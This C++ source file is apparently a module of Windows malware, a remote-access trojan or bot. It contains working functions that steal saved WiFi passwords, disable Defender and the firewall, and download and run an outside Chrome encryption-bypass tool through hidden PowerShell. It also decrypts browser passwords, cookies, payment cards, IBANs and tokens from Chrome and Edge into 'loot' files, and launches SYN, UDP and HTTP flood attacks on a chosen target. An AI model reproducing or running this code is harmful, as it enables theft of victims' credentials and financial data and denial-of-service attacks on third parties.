#include "arsenal.h"
#include "shell.h"
#include "utils.h"
#include "sqlite3.h"

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <vector>
#include <fstream>
#include <Shlwapi.h> // For PathFileExists
#include <algorithm> // For std::remove

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "Shlwapi.lib")

// ============================================================================
// 1. WiFi Stealer (Wrapping netsh)
// ============================================================================
std::string steal_wifi() {
    Shell shell;
    std::string profiles_out = shell.execute("netsh wlan show profiles");
    std::string result = "";
    
    // Quick and dirty line parsing
    size_t pos = 0;
    while ((pos = profiles_out.find("All User Profile", pos)) != std::string::npos) {
        size_t colon = profiles_out.find(':', pos);
        if (colon == std::string::npos) break;
        size_t endline = profiles_out.find('\n', colon);
        if (endline == std::string::npos) endline = profiles_out.length();
        
        std::string ssid = profiles_out.substr(colon + 1, endline - colon - 1);
        // trim
        ssid.erase(0, ssid.find_first_not_of(" \r"));
        ssid.erase(ssid.find_last_not_of(" \r") + 1);
        
        if (!ssid.empty()) {
            std::string detail = shell.execute("netsh wlan show profile name=\"" + ssid + "\" key=clear");
            size_t kpos = detail.find("Key Content");
            std::string pwd = "[OPEN/NO KEY]";
            if (kpos != std::string::npos) {
                size_t kcolon = detail.find(':', kpos);
                if (kcolon != std::string::npos) {
                    size_t kend = detail.find('\n', kcolon);
                    if (kend == std::string::npos) kend = detail.length();
                    pwd = detail.substr(kcolon + 1, kend - kcolon - 1);
                    pwd.erase(0, pwd.find_first_not_of(" \r"));
                    pwd.erase(pwd.find_last_not_of(" \r") + 1);
                }
            }
            result += "SSID: " + ssid + "  |  Password: " + pwd + "\n";
        }
        pos = endline;
    }
    
    return result.empty() ? "No WiFi profiles found." : result;
}

// ============================================================================
// 2. AV Killer (PowerShell Wrapper)
// ============================================================================
std::string av_kill() {
    std::vector<std::pair<std::string, std::string>> cmds = {
        {"Disable Defender Real-time", "Set-MpPreference -DisableRealtimeMonitoring $true"},
        {"Exclude C:\\ from scans", "Add-MpPreference -ExclusionPath 'C:\\'"},
        {"Disable Behavior Monitoring", "Set-MpPreference -DisableBehaviorMonitoring $true"},
        {"Disable IOAV Protection", "Set-MpPreference -DisableIOAVProtection $true"},
        {"Disable Script Scanning", "Set-MpPreference -DisableScriptScanning $true"},
        {"Disable Firewall (Domain)", "Set-NetFirewallProfile -Profile Domain -Enabled False"},
        {"Disable Firewall (Private)", "Set-NetFirewallProfile -Profile Private -Enabled False"},
        {"Disable Firewall (Public)", "Set-NetFirewallProfile -Profile Public -Enabled False"}
    };
    
    std::string result = "";
    Shell shell;
    
    for (auto& cmd : cmds) {
        std::string ps = "powershell.exe -NoProfile -Command \"" + cmd.second + "\"";
        std::string out = shell.execute(ps);
        
        // If there's any error text in the output, it usually means it was blocked.
        if (out.find("(no output)") != std::string::npos || out.empty()) {
            result += cmd.first + ": \xE2\x9C\x85 OK\n"; // Checkmark
        } else {
            std::string short_out = out.length() > 60 ? out.substr(0, 60) + "..." : out;
            // Trim newlines
            short_out.erase(std::remove(short_out.begin(), short_out.end(), '\n'), short_out.end());
            short_out.erase(std::remove(short_out.begin(), short_out.end(), '\r'), short_out.end());
            result += cmd.first + ": \xE2\x9D\x8C BLOCKED (" + short_out + ")\n"; // X mark
        }
    }
    return result;
}

// ============================================================================
// DPAPI Helper Functions (used by DPAPI fallback stealer)
// ============================================================================

static std::vector<BYTE> b64_decode(const std::string& b64) {
    DWORD outLen = 0;
    CryptStringToBinaryA(b64.c_str(), b64.length(), CRYPT_STRING_BASE64, nullptr, &outLen, nullptr, nullptr);
    std::vector<BYTE> out(outLen);
    CryptStringToBinaryA(b64.c_str(), b64.length(), CRYPT_STRING_BASE64, out.data(), &outLen, nullptr, nullptr);
    return out;
}

static std::vector<BYTE> get_master_key(const std::string& local_state_path) {
    std::ifstream file(local_state_path);
    if (!file) return {};
    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();
    
    std::string key = json_get(content, "encrypted_key");
    if (key.empty()) return {};
    
    std::vector<BYTE> enc_key = b64_decode(key);
    if (enc_key.size() < 5) return {};
    enc_key.erase(enc_key.begin(), enc_key.begin() + 5);
    
    DATA_BLOB in, out;
    in.pbData = enc_key.data();
    in.cbData = (DWORD)enc_key.size();
    
    if (CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, 0, &out)) {
        std::vector<BYTE> master_key(out.pbData, out.pbData + out.cbData);
        LocalFree(out.pbData);
        return master_key;
    }
    return {};
}

static std::string aes_gcm_decrypt(const std::vector<BYTE>& master_key, const std::vector<BYTE>& iv, const std::vector<BYTE>& ciphertext, const std::vector<BYTE>& tag) {
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    std::string plain = "";
    
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0) == 0) {
        if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0) == 0) {
            if (BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, (PUCHAR)master_key.data(), master_key.size(), 0) == 0) {
                DWORD cbResult = 0;
                BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
                BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
                authInfo.pbNonce = (PUCHAR)iv.data();
                authInfo.cbNonce = iv.size();
                authInfo.pbTag = (PUCHAR)tag.data();
                authInfo.cbTag = tag.size();
                
                if (BCryptDecrypt(hKey, (PUCHAR)ciphertext.data(), ciphertext.size(), &authInfo, nullptr, 0, nullptr, 0, &cbResult, 0) == 0) {
                    std::vector<BYTE> buf(cbResult);
                    if (BCryptDecrypt(hKey, (PUCHAR)ciphertext.data(), ciphertext.size(), &authInfo, nullptr, 0, buf.data(), buf.size(), &cbResult, 0) == 0) {
                        plain = std::string((char*)buf.data(), cbResult);
                    }
                }
                BCryptDestroyKey(hKey);
            }
        }
        BCryptCloseAlgorithmProvider(hAlg, 0);
    }
    return plain;
}

// ============================================================================
// 3. ChromElevator ABE Bypass (Auto-Download + Execute)
// ============================================================================

static std::string get_chromelevator() {
    std::string temp_dir = std::string(getenv("TEMP"));
    std::string elev_dir = temp_dir + "\\.chrome_elevator";
    std::string elev_exe = elev_dir + "\\chromelevator.exe";
    
    // Check if already exists
    WIN32_FIND_DATAA fd;
    if (FindFirstFileExA(elev_exe.c_str(), FindExInfoStandard, &fd, FindExSearchNameMatch, NULL, 0) != INVALID_HANDLE_VALUE) {
        return elev_exe;
    }
    
    CreateDirectoryA(elev_dir.c_str(), nullptr);
    
    // Download and extract via PowerShell
    std::string ps = "powershell.exe -WindowStyle Hidden -NoProfile -Command \""
        "Invoke-WebRequest -Uri 'https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/download/v0.20.0/chrome-injector-v0.20.0.zip' "
        "-OutFile '"+elev_dir+"\\ce.zip'; "
        "Expand-Archive -Path '"+elev_dir+"\\ce.zip' -DestinationPath '"+elev_dir+"' -Force; "
        "Remove-Item '"+elev_dir+"\\ce.zip' -Force; "
        "Get-ChildItem '"+elev_dir+"' -Filter 'chromelevator*x64*.exe' | ForEach-Object { Copy-Item $_.FullName '"+elev_exe+"' -Force }\"";
    
    Shell shell;
    shell.execute(ps);
    
    if (FindFirstFileExA(elev_exe.c_str(), FindExInfoStandard, &fd, FindExSearchNameMatch, NULL, 0) != INVALID_HANDLE_VALUE) {
        return elev_exe;
    }
    return "";
}

// Read an entire file into a string
static std::string read_file_content(const std::string& path) {
    std::ifstream f(path);
    if (!f) return "";
    return std::string((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
}

// Very basic JSON array parser for ChromElevator output
static std::string parse_chromelevator_json(const std::string& json_str, const std::string& data_type) {
    std::string result = "";
    // Simple line-by-line extraction from JSON
    // Each item is enclosed in { }
    size_t pos = 0;
    while ((pos = json_str.find('{', pos)) != std::string::npos) {
        size_t end = json_str.find('}', pos);
        if (end == std::string::npos) break;
        
        std::string item = json_str.substr(pos, end - pos + 1);
        
        if (data_type == "cookies") {
            std::string host = json_get(item, "host");
            std::string name = json_get(item, "name");
            std::string value = json_get(item, "value");
            if (value.length() > 80) value = value.substr(0, 80);
            if (!host.empty()) result += host + " | " + name + " = " + value + "\n";
        }
        else if (data_type == "passwords") {
            std::string url = json_get(item, "url");
            std::string user = json_get(item, "user");
            std::string pass = json_get(item, "pass");
            if (!user.empty()) result += "URL: " + url + "\nUser: " + user + "\nPass: " + pass + "\n\n";
        }
        else if (data_type == "payments") {
            std::string name = json_get(item, "name");
            std::string number = json_get(item, "number");
            std::string month = json_get(item, "month");
            std::string year = json_get(item, "year");
            if (!number.empty()) result += "Card: " + name + " | " + number + " | Exp: " + month + "/" + year + "\n";
        }
        else if (data_type == "iban") {
            std::string nick = json_get(item, "nickname");
            std::string iban = json_get(item, "iban");
            if (!iban.empty()) result += "IBAN: " + nick + " | " + iban + "\n";
        }
        else if (data_type == "tokens") {
            std::string service = json_get(item, "service");
            std::string token = json_get(item, "token");
            if (token.length() > 60) token = token.substr(0, 60) + "...";
            if (!service.empty()) result += "Token: " + service + " = " + token + "\n";
        }
        
        pos = end + 1;
    }
    return result;
}

static std::string steal_browser_data_chromelevator(const std::string& mode) {
    std::string elev_exe = get_chromelevator();
    if (elev_exe.empty()) return "";
    
    std::string output_dir = std::string(getenv("TEMP")) + "\\.chrome_elevator\\output";
    
    // Clean previous output
    std::string clean_cmd = "powershell.exe -WindowStyle Hidden -NoProfile -Command \"Remove-Item '" + output_dir + "' -Recurse -Force -ErrorAction SilentlyContinue\"";
    Shell shell;
    shell.execute(clean_cmd);
    
    // Execute ChromElevator
    std::string cmd = "\"" + elev_exe + "\" --output-path \"" + output_dir + "\" all";
    shell.execute(cmd);
    
    // Check output directory exists
    if (!PathFileExistsA(output_dir.c_str())) return "";
    
    std::string final_out = "";
    
    // Walk output directory: output/<Browser>/<Profile>/<type>.json
    WIN32_FIND_DATAA browser_fd;
    HANDLE hBrowser = FindFirstFileExA((output_dir + "\\*").c_str(), FindExInfoStandard, &browser_fd, FindExSearchNameMatch, NULL, 0);
    if (hBrowser == INVALID_HANDLE_VALUE) return "";
    
    do {
        if (!(browser_fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        if (std::string(browser_fd.cFileName) == "." || std::string(browser_fd.cFileName) == "..") continue;
        
        std::string browser_name = browser_fd.cFileName;
        std::string browser_path = output_dir + "\\" + browser_name;
        
        WIN32_FIND_DATAA profile_fd;
        HANDLE hProfile = FindFirstFileExA((browser_path + "\\*").c_str(), FindExInfoStandard, &profile_fd, FindExSearchNameMatch, NULL, 0);
        if (hProfile == INVALID_HANDLE_VALUE) continue;
        
        do {
            if (!(profile_fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
            if (std::string(profile_fd.cFileName) == "." || std::string(profile_fd.cFileName) == "..") continue;
            
            std::string profile_name = profile_fd.cFileName;
            std::string profile_path = browser_path + "\\" + profile_name;
            
            // Determine target files
            std::vector<std::string> targets;
            if (mode == "all") {
                targets = {"cookies", "passwords", "payments", "iban", "tokens"};
            } else if (mode == "cookies") {
                targets = {"cookies"};
            } else {
                targets = {"passwords"};
            }
            
            for (auto& t : targets) {
                std::string json_path = profile_path + "\\" + t + ".json";
                if (!PathFileExistsA(json_path.c_str())) continue;
                
                std::string json_str = read_file_content(json_path);
                if (json_str.empty()) continue;
                
                std::string parsed = parse_chromelevator_json(json_str, t);
                if (!parsed.empty()) {
                    final_out += "\n=== " + browser_name + " / " + profile_name + " - " + t + " ===\n";
                    final_out += parsed;
                }
            }
        } while (FindNextFileA(hProfile, &profile_fd));
        FindClose(hProfile);
        
    } while (FindNextFileA(hBrowser, &browser_fd));
    FindClose(hBrowser);
    
    // Cleanup output dir
    shell.execute("powershell.exe -WindowStyle Hidden -NoProfile -Command \"Remove-Item '" + output_dir + "' -Recurse -Force -ErrorAction SilentlyContinue\"");
    
    if (final_out.empty()) return "";
    
    std::string out_path = std::string(getenv("TEMP")) + "\\browser_loot_" + mode + ".txt";
    std::ofstream f(out_path);
    f << final_out;
    f.close();
    return out_path;
}

// ============================================================================
// 4. Legacy DPAPI Browser Stealer (Fallback)
// ============================================================================

static std::string steal_browser_data_dpapi(const std::string& mode) {
    std::string final_out = "";
    
    std::string local_appdata = getenv("LOCALAPPDATA");
    
    struct Browser { std::string name; std::string path; };
    std::vector<Browser> browsers = {
        {"Chrome", local_appdata + "\\Google\\Chrome\\User Data"},
        {"Edge", local_appdata + "\\Microsoft\\Edge\\User Data"}
    };
    
    for (auto& b : browsers) {
        std::string ls_path = b.path + "\\Local State";
        if (!PathFileExistsA(ls_path.c_str())) continue;
        
        std::vector<BYTE> master_key = get_master_key(ls_path);
        if (master_key.empty()) {
            final_out += b.name + ": Failed to extract master key.\n";
            continue;
        }
        
        final_out += "\n=== " + b.name + " " + (mode == "passwords" ? "Passwords" : "Cookies") + " (DPAPI Fallback) ===\n";
        
        std::vector<std::string> profiles = {"Default"};
        for (int i = 1; i <= 9; i++) profiles.push_back("Profile " + std::to_string(i));
        
        for (auto& p : profiles) {
            std::string db_name = (mode == "passwords") ? "Login Data" : "Cookies";
            std::string db_path;
            
            if (mode == "passwords") {
                db_path = b.path + "\\" + p + "\\" + db_name;
            } else {
                db_path = b.path + "\\" + p + "\\Network\\" + db_name;
                if (!PathFileExistsA(db_path.c_str())) {
                    db_path = b.path + "\\" + p + "\\" + db_name;
                }
            }
            
            if (!PathFileExistsA(db_path.c_str())) continue;
            
            std::string tmp_db = std::string(getenv("TEMP")) + "\\tmp_" + b.name + "_" + p + "_" + db_name + ".db";
            CopyFileA(db_path.c_str(), tmp_db.c_str(), FALSE);
            
            sqlite3* db;
            if (sqlite3_open(tmp_db.c_str(), &db) == SQLITE_OK) {
                sqlite3_stmt* stmt;
                std::string q = (mode == "passwords") ? 
                    "SELECT origin_url, username_value, password_value FROM logins" :
                    "SELECT host_key, name, encrypted_value FROM cookies LIMIT 200";
                
                if (sqlite3_prepare_v2(db, q.c_str(), -1, &stmt, nullptr) == SQLITE_OK) {
                    while (sqlite3_step(stmt) == SQLITE_ROW) {
                        if (mode == "passwords") {
                            std::string url = (const char*)sqlite3_column_text(stmt, 0);
                            std::string user = (const char*)sqlite3_column_text(stmt, 1);
                            if (user.empty()) continue;
                            
                            int size = sqlite3_column_bytes(stmt, 2);
                            const void* blob = sqlite3_column_blob(stmt, 2);
                            if (size > 31) {
                                std::vector<BYTE> enc(size);
                                memcpy(enc.data(), blob, size);
                                std::vector<BYTE> iv(enc.begin() + 3, enc.begin() + 15);
                                std::vector<BYTE> cipher(enc.begin() + 15, enc.end() - 16);
                                std::vector<BYTE> tag(enc.end() - 16, enc.end());
                                std::string pwd = aes_gcm_decrypt(master_key, iv, cipher, tag);
                                if (!pwd.empty()) final_out += "URL: " + url + "\nUser: " + user + "\nPass: " + pwd + "\n\n";
                                else final_out += "URL: " + url + "\nUser: " + user + "\nPass: [DECRYPT FAILED]\n\n";
                            }
                        } else {
                            std::string host = (const char*)sqlite3_column_text(stmt, 0);
                            std::string name = (const char*)sqlite3_column_text(stmt, 1);
                            int size = sqlite3_column_bytes(stmt, 2);
                            const void* blob = sqlite3_column_blob(stmt, 2);
                            if (size > 31) {
                                std::vector<BYTE> enc(size);
                                memcpy(enc.data(), blob, size);
                                std::vector<BYTE> iv(enc.begin() + 3, enc.begin() + 15);
                                std::vector<BYTE> cipher(enc.begin() + 15, enc.end() - 16);
                                std::vector<BYTE> tag(enc.end() - 16, enc.end());
                                std::string val = aes_gcm_decrypt(master_key, iv, cipher, tag);
                                if (!val.empty()) {
                                    std::string short_val = val.length() > 80 ? val.substr(0,80) : val;
                                    final_out += host + " | " + name + " = " + short_val + "\n";
                                }
                            }
                        }
                    }
                    sqlite3_finalize(stmt);
                }
                sqlite3_close(db);
            }
            DeleteFileA(tmp_db.c_str());
        }
    }
    
    if (final_out.empty()) return "";
    
    std::string out_path = std::string(getenv("TEMP")) + "\\browser_loot_" + mode + ".txt";
    std::ofstream f(out_path);
    f << final_out;
    f.close();
    return out_path;
}

// ============================================================================
// 5. Main steal_browser_data() — ChromElevator first, DPAPI fallback
// ============================================================================

std::string steal_browser_data(const std::string& mode) {
    // Try ChromElevator ABE bypass first
    std::string result = steal_browser_data_chromelevator(mode);
    if (!result.empty()) return result;
    
    // Fallback to legacy DPAPI
    std::string fallback_mode = (mode == "all") ? "passwords" : mode;
    return steal_browser_data_dpapi(fallback_mode);
}

// ============================================================================
// Phase 9: DDoS Arsenal (Mirai-Inspired)
// ============================================================================

#include <thread>
#include <atomic>
#include <sstream>

static std::atomic<bool> g_attack_running(false);
static std::atomic<long long> g_attack_packets(0);
static std::string g_attack_type = "";
static std::thread g_attack_thread;

static bool attack_wsa_init() {
    static bool done = false;
    if (!done) {
        WSADATA wsa;
        if (WSAStartup(MAKEWORD(2, 2), &wsa) == 0) done = true;
    }
    return done;
}

// --- SYN Flood (TCP Connect Flood) ---
static void syn_flood_loop(const std::string& target, int port, int duration_sec) {
    if (!attack_wsa_init()) return;
    log_msg("[ATTACK] SYN Flood started -> " + target + ":" + std::to_string(port) + " for " + std::to_string(duration_sec) + "s");

    sockaddr_in addr = {};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, target.c_str(), &addr.sin_addr);

    DWORD start = GetTickCount();
    DWORD end_time = start + (duration_sec * 1000);

    while (g_attack_running.load() && GetTickCount() < end_time) {
        // Open 16 connections per burst
        SOCKET socks[16];
        for (int i = 0; i < 16; i++) {
            socks[i] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (socks[i] != INVALID_SOCKET) {
                // Non-blocking connect
                u_long mode = 1;
                ioctlsocket(socks[i], FIONBIO, &mode);
                connect(socks[i], (sockaddr*)&addr, sizeof(addr));
                g_attack_packets++;
            }
        }
        Sleep(1); // Tiny delay to not choke our own CPU
        for (int i = 0; i < 16; i++) {
            if (socks[i] != INVALID_SOCKET) closesocket(socks[i]);
        }
    }
    g_attack_running = false;
    log_msg("[ATTACK] SYN Flood complete. Packets: " + std::to_string(g_attack_packets.load()));
}

// --- UDP Flood ---
static void udp_flood_loop(const std::string& target, int port, int duration_sec) {
    if (!attack_wsa_init()) return;
    log_msg("[ATTACK] UDP Flood started -> " + target + ":" + std::to_string(port) + " for " + std::to_string(duration_sec) + "s");

    SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock == INVALID_SOCKET) { g_attack_running = false; return; }

    sockaddr_in addr = {};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, target.c_str(), &addr.sin_addr);

    // 1024-byte random payload
    char payload[1024];
    for (int i = 0; i < 1024; i++) payload[i] = (char)(rand() % 256);

    DWORD end_time = GetTickCount() + (duration_sec * 1000);

    while (g_attack_running.load() && GetTickCount() < end_time) {
        for (int i = 0; i < 64; i++) { // 64 packets per burst
            sendto(sock, payload, sizeof(payload), 0, (sockaddr*)&addr, sizeof(addr));
            g_attack_packets++;
        }
        Sleep(0); // Yield but don't wait
    }
    closesocket(sock);
    g_attack_running = false;
    log_msg("[ATTACK] UDP Flood complete. Packets: " + std::to_string(g_attack_packets.load()));
}

// --- HTTP Flood ---
static void http_flood_loop(const std::string& target_url, int duration_sec) {
    if (!attack_wsa_init()) return;
    log_msg("[ATTACK] HTTP Flood started -> " + target_url + " for " + std::to_string(duration_sec) + "s");

    // Parse URL: assume http://host:port/path
    std::string host = target_url;
    int port = 80;
    std::string path = "/";

    // Strip protocol
    if (host.find("http://") == 0)  host = host.substr(7);
    if (host.find("https://") == 0) { host = host.substr(8); port = 443; }

    // Extract path
    size_t slash = host.find('/');
    if (slash != std::string::npos) {
        path = host.substr(slash);
        host = host.substr(0, slash);
    }

    // Extract port
    size_t colon = host.find(':');
    if (colon != std::string::npos) {
        port = std::atoi(host.substr(colon + 1).c_str());
        host = host.substr(0, colon);
    }

    std::string request = "GET " + path + " HTTP/1.1\r\nHost: " + host +
                          "\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
                          "Connection: close\r\n\r\n";

    sockaddr_in addr = {};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);

    // Resolve hostname
    struct addrinfo hints = {}, *result = nullptr;
    hints.ai_family = AF_INET;
    if (getaddrinfo(host.c_str(), nullptr, &hints, &result) == 0 && result) {
        addr.sin_addr = ((sockaddr_in*)result->ai_addr)->sin_addr;
        freeaddrinfo(result);
    } else {
        inet_pton(AF_INET, host.c_str(), &addr.sin_addr);
    }

    DWORD end_time = GetTickCount() + (duration_sec * 1000);

    while (g_attack_running.load() && GetTickCount() < end_time) {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) { Sleep(10); continue; }

        u_long mode = 1;
        ioctlsocket(sock, FIONBIO, &mode);
        connect(sock, (sockaddr*)&addr, sizeof(addr));

        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(sock, &fds);
        timeval tv = { 2, 0 };

        if (select(0, nullptr, &fds, nullptr, &tv) > 0) {
            send(sock, request.c_str(), (int)request.length(), 0);
            g_attack_packets++;
        }
        closesocket(sock);
    }
    g_attack_running = false;
    log_msg("[ATTACK] HTTP Flood complete. Requests: " + std::to_string(g_attack_packets.load()));
}

// --- Public API ---

std::string attack_syn(const std::string& target, int port, int duration_sec) {
    if (g_attack_running.load()) return "Attack already running. Use 'attack stop' first.";
    g_attack_running = true;
    g_attack_packets = 0;
    g_attack_type = "SYN Flood -> " + target + ":" + std::to_string(port);
    g_attack_thread = std::thread(syn_flood_loop, target, port, duration_sec);
    g_attack_thread.detach();
    return "SYN Flood launched -> " + target + ":" + std::to_string(port) + " for " + std::to_string(duration_sec) + "s";
}

std::string attack_udp(const std::string& target, int port, int duration_sec) {
    if (g_attack_running.load()) return "Attack already running. Use 'attack stop' first.";
    g_attack_running = true;
    g_attack_packets = 0;
    g_attack_type = "UDP Flood -> " + target + ":" + std::to_string(port);
    g_attack_thread = std::thread(udp_flood_loop, target, port, duration_sec);
    g_attack_thread.detach();
    return "UDP Flood launched -> " + target + ":" + std::to_string(port) + " for " + std::to_string(duration_sec) + "s";
}

std::string attack_http(const std::string& target_url, int duration_sec) {
    if (g_attack_running.load()) return "Attack already running. Use 'attack stop' first.";
    g_attack_running = true;
    g_attack_packets = 0;
    g_attack_type = "HTTP Flood -> " + target_url;
    g_attack_thread = std::thread(http_flood_loop, target_url, duration_sec);
    g_attack_thread.detach();
    return "HTTP Flood launched -> " + target_url + " for " + std::to_string(duration_sec) + "s";
}

void attack_stop_all() {
    g_attack_running = false;
}

std::string attack_status() {
    if (!g_attack_running.load()) {
        return "No attack running. Last: " + (g_attack_type.empty() ? "none" : g_attack_type) +
               " | Total packets: " + std::to_string(g_attack_packets.load());
    }
    return "ACTIVE: " + g_attack_type + " | Packets sent: " + std::to_string(g_attack_packets.load());
}

